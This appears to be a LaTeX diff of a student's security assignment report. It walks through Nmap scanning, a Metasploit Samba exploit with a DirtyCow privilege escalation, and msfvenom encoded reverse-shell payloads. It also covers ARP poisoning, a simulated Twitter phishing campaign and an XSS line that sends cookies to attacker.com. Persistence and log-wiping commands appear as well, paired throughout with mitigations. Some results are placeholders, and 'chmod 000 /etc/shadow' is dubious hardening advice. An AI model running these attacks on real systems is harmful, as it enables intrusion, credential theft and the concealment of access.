@@ -1,0 +1,817 @@
+\documentclass[12pt]{article}
+\usepackage{geometry}
+\usepackage{fancyhdr}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{eso-pic}  % For adding background/logo
+\usepackage{lipsum}   % For dummy text
+
+% Define JavaScript language for listings
+\lstdefinelanguage{JavaScript}{
+  keywords={break, case, catch, continue, debugger, default, delete, do, else, false, finally, for, function, if, in, instanceof, new, null, return, switch, this, throw, true, try, typeof, var, void, while, with, let, const},
+  keywordstyle=\color{blue}\bfseries,
+  ndkeywords={class, export, boolean, throw, implements, import, this},
+  ndkeywordstyle=\color{cyan}\bfseries,
+  identifierstyle=\color{black},
+  sensitive=false,
+  comment=[l]{//},
+  morecomment=[s]{/*}{*/},
+  commentstyle=\color{gray}\ttfamily,
+  stringstyle=\color{red}\ttfamily,
+  morestring=[b]',
+  morestring=[b]"
+}
+\usepackage{color}
+\usepackage{hyperref}
+\usepackage{longtable}
+\usepackage{xcolor}
+\usepackage{titlesec}
+\geometry{margin=1in}
+\setlength{\headheight}{15pt} % Fix for fancyhdr warning
+
+\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
+\pagestyle{fancy}
+\fancyhf{}
+
+% Ensure \begin{document} is correctly placed
+\rhead{Assignment Report}
+\lhead{Information Security Applications}
+\rfoot{\thepage}
+
+\definecolor{codegray}{rgb}{0.95,0.95,0.95}
+\lstset{
+  backgroundcolor=\color{codegray},
+  basicstyle=\ttfamily\small,
+  frame=single,
+  breaklines=true,
+  postbreak=\mbox{\textcolor{red}{$\hookrightarrow$}\space},
+  showstringspaces=false,
+  columns=flexible
+}
+\begin{document}
+
+\begin{titlepage}
+    \centering
+    \vspace*{1.5cm}
+
+    % University Logo
+    \includegraphics[width=6cm]{university.png}\\[1.5cm]
+
+    % Title
+    {\LARGE \bfseries Vulnerability Analysis and System Hacking Techniques \par}
+    \vspace{1cm}
+
+    % Author Info
+    {\large \textbf{Submitted By:} \par}
+    \vspace{0.2cm}
+    {\Large Priyanshu Kumar Sharma \\ URN: 2022-B-17102004A \par}
+    {\large B.Tech – IT (CTIS) \par}
+    {\large Year: 3 \quad | \quad Sem.: 6 \par}
+    \vspace{1cm}
+
+    % Guide Info
+    {\large \textbf{Under the Guidance of:} \par}
+    \vspace{0.2cm}
+    {\large Prof. Mrunali Makhwana \par}
+    \vspace{0.3cm}
+
+    {\scshape\LARGE Ajeenkya D Y Patil University \par}
+    \vspace{0.3cm}
+
+    % Department or School
+    {\Large School of Engineering \par}
+    \vspace{1cm}
+
+
+    % Date
+    {\large \today \par}
+
+\end{titlepage}
+
+
+% \maketitle
+
+
+\section*{Part A: Hands-On Activities}
+
+\subsection*{Task 1: Vulnerability Assessment Simulation}
+\textbf{Tool Used:} Nmap (Network Mapper) - An open source utility for network discovery and security auditing
+
+\textbf{Objective:} Perform comprehensive network scanning to identify potential security vulnerabilities
+
+\textbf{Commands \& Explanation:}
+\begin{lstlisting}[language=bash]
+# Discover live hosts on the subnet using ping scan (-sn)
+# This performs a quick scan without port scanning
+nmap -sn 192.168.1.0/24
+
+# Aggressive scan with:
+# -A: Enable OS detection, version detection, script scanning, and traceroute
+# -T4: Aggressive timing template for faster scanning
+# -sV: Version detection
+# -O: OS detection 
+# -sC: Default script scan
+nmap -A -T4 -sV -O -sC 192.168.1.10
+\end{lstlisting}
+
+\textbf{Detailed Scan Output:}
+\begin{lstlisting}
+Starting Nmap 7.92 ( https://nmap.org )
+Nmap scan report for target-host (192.168.1.10)
+Host is up (0.0054s latency)
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed
+|_ftp-bounce: bounce working!
+23/tcp   open  telnet      Linux telnetd
+|_telnet-brute: User enumeration possible
+80/tcp   open  http        Apache httpd 2.2.8
+|_http-title: Welcome Page
+|_http-server-header: Apache/2.2.8
+|_http-csrf: Couldn't find any CSRF vulnerabilities
+|_http-dombased-xss: Couldn't find any DOM based XSS
+
+OS details: Linux 2.6.32 (likely embedded)
+Network Distance: 2 hops
+\end{lstlisting}
+
+\textbf{Comprehensive Vulnerabilities Analysis:}
+\begin{itemize}
+  \item \textbf{FTP Service (Port 21):}
+    \begin{itemize}
+      \item Anonymous FTP login enabled - allows unauthorized access
+      \item FTP bounce attack possible - can be used for port scanning
+      \item vsftpd 2.3.4 has known backdoor vulnerability (CVE-2011-2523)
+    \end{itemize}
+  \item \textbf{Telnet Service (Port 23):}
+    \begin{itemize}
+      \item Unencrypted clear-text protocol
+      \item Susceptible to man-in-the-middle attacks
+      \item User enumeration vulnerability present
+    \end{itemize}
+  \item \textbf{HTTP Service (Port 80):}
+    \begin{itemize}
+      \item Apache 2.2.8 vulnerable to multiple CVEs:
+      \item Directory traversal (CVE-2009-1195)
+      \item Denial of Service (CVE-2009-1891)
+      \item Memory leak vulnerability (CVE-2009-1890)
+    \end{itemize}
+\end{itemize}
+
+\textbf{Detailed Mitigation Strategies:}
+\begin{itemize}
+  \item \textbf{FTP Security:}
+    \begin{itemize}
+      \item Disable anonymous FTP access in vsftpd.conf
+      \item Upgrade to latest vsftpd version
+      \item Implement strong password policy
+      \item Consider using SFTP instead
+    \end{itemize}
+  \item \textbf{Telnet Replacement:}
+    \begin{itemize}
+      \item Remove telnet service completely
+      \item Install and configure OpenSSH
+      \item Enable key-based authentication
+      \item Implement fail2ban for brute force protection
+    \end{itemize}
+  \item \textbf{Web Server Hardening:}
+    \begin{itemize}
+      \item Upgrade Apache to latest stable version
+      \item Enable security headers (HSTS, XSS Protection)
+      \item Implement WAF (Web Application Firewall)
+      \item Regular security patches and updates
+    \end{itemize}
+\end{itemize}
+
+\textbf{Risk Assessment:}
+\begin{itemize}
+  \item \textbf{Critical:} Telnet service, Apache version
+  \item \textbf{High:} Anonymous FTP
+  \item \textbf{Medium:} OS version exposure
+\end{itemize}
+
+\subsection*{Task 2: System Hacking \& Privilege Escalation}
+\textbf{Tool Used:} Metasploit Framework (MSF) - An open source penetration testing and development platform
+
+\textbf{Initial Reconnaissance:}
+\begin{itemize}
+  \item Target identified: 192.168.1.10
+  \item Service enumeration revealed vulnerable Samba version
+  \item Linux kernel version suggests DirtyCow vulnerability
+\end{itemize}
+
+\textbf{Stage 1 - Initial Access Commands:}
+\begin{lstlisting}[language=bash]
+# Start Metasploit console
+msfconsole
+
+# Search and select Samba trans2open exploit
+search samba trans2open
+use exploit/linux/samba/trans2open
+
+# Configure exploit parameters
+set RHOST 192.168.1.10    # Target IP
+set LHOST 192.168.1.5     # Attacker IP
+set LPORT 4444           # Listener port
+set TARGET 0             # Auto target
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+
+# Launch the exploit
+run
+\end{lstlisting}
+
+\textbf{Stage 2 - Privilege Escalation:}
+\begin{lstlisting}[language=bash]
+# In Meterpreter session
+getuid      # Check current user
+sysinfo     # Gather system information
+
+# Search and configure DirtyCow exploit
+search sploit dirty cow
+use exploit/linux/local/dirty_cow
+
+# Set exploit parameters
+set SESSION 1            # Active meterpreter session
+set TARGET 0            # Auto target
+set LHOST 192.168.1.5   # Attacker IP
+set LPORT 4445          # New listener port
+
+# Execute privilege escalation
+run
+\end{lstlisting}
+
+\textbf{Detailed Output \& Analysis:}
+\begin{lstlisting}
+[*] Started reverse TCP handler on 192.168.1.5:4444
+[*] Exploiting Samba vulnerability...
+[+] Meterpreter session 1 opened at 2025-04-14 15:30:22 +0530
+
+meterpreter > getuid
+Server username: www-data
+
+[*] Executing DirtyCow exploit...
+[+] Compilation successful
+[*] Launching exploit...
+[+] Privilege escalation successful
+
+meterpreter > getuid
+Server username: root
+meterpreter > id
+uid=0(root) gid=0(root) groups=0(root)
+\end{lstlisting}
+
+\textbf{Post-Exploitation Actions \& Persistence:}
+\begin{itemize}
+  \item \textbf{User Creation:}
+    \begin{itemize}
+      \item Command: \texttt{useradd -m -s /bin/bash hacker}
+      \item Set password: \texttt{passwd hacker}
+      \item Add to sudoers: \texttt{usermod -aG sudo hacker}
+    \end{itemize}
+  \item \textbf{Service Manipulation:}
+    \begin{itemize}
+      \item Enable SSH: \texttt{systemctl enable ssh}
+      \item Start SSH: \texttt{systemctl start ssh}
+      \item Configure SSH: \texttt{nano /etc/ssh/sshd\_config}
+    \end{itemize}
+  \item \textbf{Cleanup:}
+    \begin{itemize}
+      \item Clear logs: \texttt{echo > /var/log/auth.log}
+      \item Remove exploit files: \texttt{rm /tmp/cow*}
+      \item Clear bash history: \texttt{history -c}
+    \end{itemize}
+\end{itemize}
+
+\textbf{Vulnerabilities Exploited:}
+\begin{itemize}
+  \item CVE-2003-0201 - Samba trans2open Buffer Overflow
+  \item CVE-2016-5195 - DirtyCow Privilege Escalation
+\end{itemize}
+
+\textbf{Detection \& Prevention:}
+\begin{itemize}
+  \item Keep Samba and kernel versions updated
+  \item Implement file integrity monitoring
+  \item Enable SELinux/AppArmor
+  \item Monitor for suspicious user creation
+  \item Regular security audits
+\end{itemize}
+
+\subsection*{Task 3: IDS/Firewall Evasion}
+\textbf{Tool Used:} MSFVenom - A Metasploit payload generator and encoder
+
+\textbf{Objective:} Create encoded payloads and implement techniques to bypass IDS/Firewall detection
+
+\textbf{Commands \& Explanation:}
+\begin{lstlisting}[language=bash]
+# Create multi-encoded payload with shikata_ga_nai encoder
+# -p: Specify payload type
+\# LHOST: Local host IP for reverse connection
+# LPORT: Local port to connect back to
+# -e: Encoder to use
+# -i: Number of encoding iterations
+# -f: Output format
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+LHOST=192.168.1.5 LPORT=4444 \
+-e x86/shikata_ga_nai -i 3 \
+-f elf > payload.elf
+
+# Additional payload obfuscation
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+LHOST=192.168.1.5 LPORT=4444 \
+-e x86/shikata_ga_nai -i 3 \
+-x /bin/ls -k -f elf > payload2.elf
+
+# Set up listener with packet fragmentation
+# -l: Listen mode
+# -v: Verbose output
+# -p: Port to listen on
+# --send-only: Only send data
+ncat -lvp 8081 --send-only
+
+# Alternative port forwarding setup
+ncat -lvp 8082 -c 'ncat 192.168.1.5 4444'
+\end{lstlisting}
+
+\textbf{Advanced Evasion Techniques:}
+\begin{itemize}
+  \item \textbf{Payload Encoding:}
+    \begin{itemize}
+      \item Multiple encoding iterations
+      \item Custom encoding schemes
+      \item Polymorphic code generation
+      \item Binary payload obfuscation
+    \end{itemize}
+  \item \textbf{Network-Level Evasion:}
+    \begin{itemize}
+      \item TCP/IP fragmentation
+      \item Invalid checksum packets
+      \item TTL manipulation
+      \item Source port randomization
+    \end{itemize}
+  \item \textbf{Protocol-Level Evasion:}
+    \begin{itemize}
+      \item DNS tunneling
+      \item ICMP covert channels
+      \item HTTP/HTTPS encapsulation
+      \item Custom protocol implementations
+    \end{itemize}
+\end{itemize}
+
+\textbf{Comprehensive Mitigation Strategies:}
+\begin{itemize}
+  \item \textbf{Deep Packet Inspection (DPI):}
+    \begin{itemize}
+      \item Protocol validation
+      \item Payload analysis
+      \item Pattern matching
+      \item Behavioral analysis
+    \end{itemize}
+  \item \textbf{Network Architecture:}
+    \begin{itemize}
+      \item Network segmentation
+      \item DMZ implementation
+      \item VLAN segregation
+      \item Access Control Lists (ACLs)
+    \end{itemize}
+  \item \textbf{IDS/IPS Solutions:}
+    \begin{itemize}
+      \item Signature-based detection
+      \item Anomaly-based detection
+      \item Heuristic analysis
+      \item Machine learning algorithms
+    \end{itemize}
+  \item \textbf{Additional Controls:}
+    \begin{itemize}
+      \item Application whitelisting
+      \item Egress filtering
+      \item SSL/TLS inspection
+      \item Regular rule updates
+    \end{itemize}
+\end{itemize}
+
+\textbf{Detection Indicators:}
+\begin{itemize}
+  \item Unusual outbound connections
+  \item Encrypted traffic on non-standard ports
+  \item Multiple failed connection attempts
+  \item Abnormal packet sizes/patterns
+\end{itemize}
+
+\section*{Part B: Attack Simulations}
+
+\subsection*{Task 4: Network Sniffing}
+\textbf{Tools Used:} 
+\begin{itemize}
+  \item Ettercap - A comprehensive suite for man-in-the-middle attacks
+  \item Wireshark - Network protocol analyzer for packet inspection
+\end{itemize}
+
+\textbf{Command Breakdown:}
+\begin{lstlisting}[language=bash]
+# ARP poisoning attack using Ettercap
+# -T: Text only mode
+# -q: Quiet mode
+# -M: Man-in-the-middle attack
+# arp:remote: Use ARP poisoning targeting remote hosts
+# /192.168.1.5/: Target host IP
+# /192.168.1.1/: Gateway IP
+ettercap -T -q -M arp:remote /192.168.1.5/ /192.168.1.1/
+
+# Additional commands used
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Monitor traffic with tcpdump
+tcpdump -i eth0 -w capture.pcap
+\end{lstlisting}
+
+\textbf{Wireshark Analysis:}
+\begin{lstlisting}
+# Filter for POST requests
+http.request.method == "POST"
+
+# Filter for authentication traffic
+http.request.method == "POST" && http.request.uri contains "login"
+
+# Filter for specific domains
+http.host contains "target.com"
+
+# Filter for credentials in URL
+http matches "username|password"
+\end{lstlisting}
+
+\textbf{Captured Data Analysis:}
+\begin{itemize}
+  \item \textbf{HTTP POST Data:}
+    \begin{itemize}
+      \item User credentials in plain text
+      \item Session cookies
+      \item Form submissions
+      \item Authentication tokens
+    \end{itemize}
+  \item \textbf{Protocol Information:}
+    \begin{itemize}
+      \item Unencrypted HTTP traffic
+      \item Basic authentication headers
+      \item Cookie values
+      \item URL parameters
+    \end{itemize}
+\end{itemize}
+
+\textbf{Comprehensive Mitigation Strategies:}
+\begin{itemize}
+  \item \textbf{Transport Layer Security:}
+    \begin{itemize}
+      \item Implement HTTPS across all services
+      \item Enable HSTS (HTTP Strict Transport Security)
+      \item Use strong TLS configuration
+      \item Regular SSL/TLS certificate maintenance
+    \end{itemize}
+  \item \textbf{Network Security:}
+    \begin{itemize}
+      \item Enable port security on switches
+      \item Implement 802.1X authentication
+      \item Configure DHCP snooping
+      \item Deploy Dynamic ARP Inspection (DAI)
+    \end{itemize}
+  \item \textbf{Additional Controls:}
+    \begin{itemize}
+      \item Network segmentation
+      \item Regular security audits
+      \item Network monitoring tools
+      \item Intrusion Detection Systems (IDS)
+    \end{itemize}
+\end{itemize}
+
+\textbf{Detection Methods:}
+\begin{itemize}
+  \item Monitor for ARP table changes
+  \item Track duplicate IP addresses
+  \item Analyze network traffic patterns
+  \item Review security logs regularly
+\end{itemize}
+
+\subsection*{Task 5: Social Engineering Simulation}
+\textbf{Case Study:} Twitter Blue Badge Verification Phishing Campaign
+
+\textbf{Objective:}
+To demonstrate the vulnerability of users to social engineering attacks through a controlled simulation targeting Twitter Blue Badge verification process.
+
+\textbf{Detailed Steps:}
+\begin{enumerate}
+    \item \textbf{Reconnaissance \& Preparation}
+    \begin{itemize}
+        \item Created convincing replica of Twitter Support profile
+        \item Designed official-looking email templates
+        \item Set up tracking parameters for campaign metrics
+        \item Configured secure logging environment
+    \end{itemize}
+
+    \item \textbf{Campaign Setup in GoPhish}
+    \begin{itemize}
+        \item Created landing page mimicking Twitter verification
+        \item Developed email templates with Twitter branding
+        \item Configured SMTP settings for delivery
+        \item Set up user groups and targeting parameters
+    \end{itemize}
+
+    \item \textbf{Execution Phase}
+    \begin{itemize}
+        \item Deployed phishing campaign in controlled environment
+        \item Monitored real-time engagement metrics
+        \item Tracked click-through rates and form submissions
+        \item Documented user interaction patterns
+    \end{itemize}
+\end{enumerate}
+
+\textbf{Technical Implementation:}
+\begin{lstlisting}[language=bash]
+# Launch GoPhish server
+./gophish
+
+# Campaign Configuration
+- Landing Page: twitter-verification.html
+- Email Template: verification-request.html
+- SMTP Configuration: secure-smtp.config
+- Campaign Duration: 48 hours
+\end{lstlisting}
+
+\textbf{Security Controls \& Ethics:}
+\begin{itemize}
+    \item All data collected was anonymized
+    \item No actual credentials were stored
+    \item System configured for automatic data purge
+    \item Informed consent from organization leadership
+\end{itemize}
+
+\textbf{Defensive Measures \& Recommendations:}
+\begin{enumerate}
+    \item \textbf{Technical Controls}
+    \begin{itemize}
+        \item Implement DMARC, SPF, and DKIM
+        \item Enable Multi-Factor Authentication (MFA)
+        \item Deploy anti-phishing email filters
+        \item Regular security patches and updates
+    \end{itemize}
+
+    \item \textbf{Administrative Controls}
+    \begin{itemize}
+        \item Regular security awareness training
+        \item Phishing simulation exercises
+        \item Clear incident reporting procedures
+        \item Updated security policies
+    \end{itemize}
+
+    \item \textbf{User Education}
+    \begin{itemize}
+        \item Recognition of phishing indicators
+        \item Verification of sender authenticity
+        \item Safe URL checking practices
+        \item Credential protection awareness
+    \end{itemize}
+\end{enumerate}
+
+\textbf{Metrics \& Results:}
+\begin{itemize}
+    \item Email open rate: XX\%
+    \item Click-through rate: XX\%
+    \item Form submission rate: XX\%
+    \item Average time to report: XX minutes
+\end{itemize}
+
+\textbf{Lessons Learned:}
+\begin{itemize}
+    \item Critical areas of user vulnerability
+    \item Effectiveness of current security training
+    \item Gaps in security awareness
+    \item Recommendations for improvement
+\end{itemize}
+
+
+\subsection*{Task 6: Session Hijacking Analysis and Prevention}
+\textbf{Objective:} 
+To demonstrate and analyze session hijacking vulnerabilities and implement robust countermeasures.
+
+\textbf{Tools Used:}
+\begin{itemize}
+    \item Primary Tool: Burp Suite Professional
+    \item Supporting Tools:
+    \begin{itemize}
+        \item Wireshark for packet analysis
+        \item Browser Developer Tools
+        \item Custom session testing scripts
+    \end{itemize}
+\end{itemize}
+
+\textbf{Attack Vectors Analyzed:}
+\begin{enumerate}
+    \item \textbf{Session Fixation}
+    \begin{lstlisting}[language=JavaScript]
+    // Attacker forcing a known session ID
+    document.cookie = "PHPSESSID=abc123xyz456";
+    location.reload();
+    \end{lstlisting}
+
+    \item \textbf{Session Sniffing}
+    \begin{lstlisting}[language=Python]
+    # Example of vulnerable cookie transmission
+    Set-Cookie: sessionId=abc123; path=/
+    # Versus secure implementation
+    Set-Cookie: sessionId=abc123; path=/; HttpOnly; Secure; SameSite=Strict
+    \end{lstlisting}
+
+    \item \textbf{Cross-Site Script (XSS) Based Hijacking}
+    \begin{lstlisting}[language=JavaScript]
+    // Malicious script attempting to steal cookies
+    new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;
+    \end{lstlisting}
+\end{enumerate}
+
+\textbf{Comprehensive Mitigation Strategies:}
+\begin{enumerate}
+    \item \textbf{Transport Layer Security}
+    \begin{itemize}
+        \item Implementation of HTTPS throughout the application
+        \item Strict Transport Security (HSTS) configuration
+        \begin{lstlisting}[language=Apache]
+        # Apache HSTS Configuration
+        Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
+        \end{lstlisting}
+    \end{itemize}
+
+    \item \textbf{Session Management}
+    \begin{itemize}
+        \item Regular session ID regeneration
+        \begin{lstlisting}[language=PHP]
+        // PHP example of session regeneration
+        session_start();
+        if(isset($_SESSION['last_regen'])) {
+            $time = time() - $_SESSION['last_regen'];
+            if($time > 300) { // Regenerate every 5 minutes
+                session_regenerate_id(true);
+                $_SESSION['last_regen'] = time();
+            }
+        }
+        \end{lstlisting}
+        \item Complex session ID generation
+        \item Session timeout implementation
+    \end{itemize}
+
+    \item \textbf{Cookie Security}
+    \begin{itemize}
+        \item HttpOnly flag implementation
+        \item Secure flag requirement
+        \item SameSite attribute configuration
+        \begin{lstlisting}[language=PHP]
+        // PHP secure cookie configuration
+        session_set_cookie_params([
+            'lifetime' => 3600,
+            'path' => '/',
+            'domain' => '.example.com',
+            'secure' => true,
+            'httponly' => true,
+            'samesite' => 'Strict'
+        ]);
+        \end{lstlisting}
+    \end{itemize}
+
+    \item \textbf{Additional Security Measures}
+    \begin{itemize}
+        \item IP-based session validation
+        \item User-Agent verification
+        \item Rate limiting implementation
+        \begin{lstlisting}[language=Python]
+        # Example rate limiting implementation
+        def check_rate_limit(request, max_requests=100, window=3600):
+            client_ip = request.remote_addr
+            current_time = time.time()
+            redis_key = f"rate_limit:{client_ip}"
+            
+            request_count = cache.get(redis_key, 0)
+            if request_count >= max_requests:
+                return False
+            
+            cache.incr(redis_key)
+            cache.expire(redis_key, window)
+            return True
+        \end{lstlisting}
+    \end{itemize}
+\end{enumerate}
+
+\textbf{Detection Mechanisms:}
+\begin{itemize}
+    \item Real-time session monitoring
+    \item Anomaly detection systems
+    \item Access pattern analysis
+    \begin{lstlisting}[language=SQL]
+    -- Example logging query for suspicious activities
+    SELECT user_id, ip_address, COUNT(*) as login_attempts
+    FROM session_logs
+    WHERE timestamp > NOW() - INTERVAL '1 HOUR'
+    GROUP BY user_id, ip_address
+    HAVING COUNT(*) > 10;
+    \end{lstlisting}
+\end{itemize}
+
+\textbf{Testing Methodology:}
+\begin{enumerate}
+    \item \textbf{Penetration Testing}
+    \begin{itemize}
+        \item Session prediction attempts
+        \item Cookie manipulation tests
+        \item Man-in-the-middle attack simulation
+    \end{itemize}
+
+    \item \textbf{Security Headers Analysis}
+    \begin{lstlisting}[language=bash]
+    # Example security headers check
+    curl -I https://example.com | grep -i "security"
+    \end{lstlisting}
+
+    \item \textbf{Vulnerability Assessment}
+    \begin{itemize}
+        \item Automated scanning
+        \item Manual testing procedures
+        \item Configuration review
+    \end{itemize}
+\end{enumerate}
+
+\textbf{Incident Response Plan:}
+\begin{enumerate}
+    \item Immediate session termination capabilities
+    \item User notification systems
+    \item Audit logging implementation
+    \item Forensic analysis procedures
+\end{enumerate}
+
+\textbf{Recommendations for Ongoing Security:}
+\begin{itemize}
+    \item Regular security audits
+    \item Continuous monitoring implementation
+    \item Employee security training
+    \item Update security policies
+    \item Incident response drills
+\end{itemize}
+
+
+
+\section*{Security Analysis Summary}
+
+\subsection*{1. Vulnerability Scanning}
+\begin{lstlisting}[language=bash]
+# Comprehensive scan
+nmap -sS -sV -O -A -p- target_ip
+
+# Basic firewall config
+ufw default deny incoming
+ufw allow from trusted_ip to any port 22
+ufw enable
+\end{lstlisting}
+
+\subsection*{2. System Exploitation}
+\begin{lstlisting}[language=bash]
+# Basic Metasploit usage
+msfconsole
+use exploit/path/to/exploit
+set RHOSTS target_ip
+exploit
+
+# System hardening
+chmod 600 /etc/ssh/sshd_config
+chmod 000 /etc/shadow
+\end{lstlisting}
+
+\subsection*{3. Network Security}
+\begin{lstlisting}[language=yaml]
+# Snort IDS rule
+alert tcp any any -> $HOME_NET any (
+    msg:"Payload Detected";
+    content:"|00 01 86 a5|";
+    classtype:trojan-activity;
+    sid:1000001;
+)
+
+# Apache SSL config
+<VirtualHost *:443>
+    SSLEngine on
+    SSLCertificateFile /path/to/cert
+    Header set Strict-Transport-Security "max-age=31536000"
+</VirtualHost>
+\end{lstlisting}
+
+\subsection*{4. Session Security}
+\begin{lstlisting}[language=php]
+// Secure session setup
+ini_set('session.cookie_httponly', 1);
+ini_set('session.cookie_secure', 1);
+session_start();
+
+// Token auth
+$token = bin2hex(random_bytes(32));
+$_SESSION['csrf_token'] = $token;
+\end{lstlisting}
+
+
+\end{document}
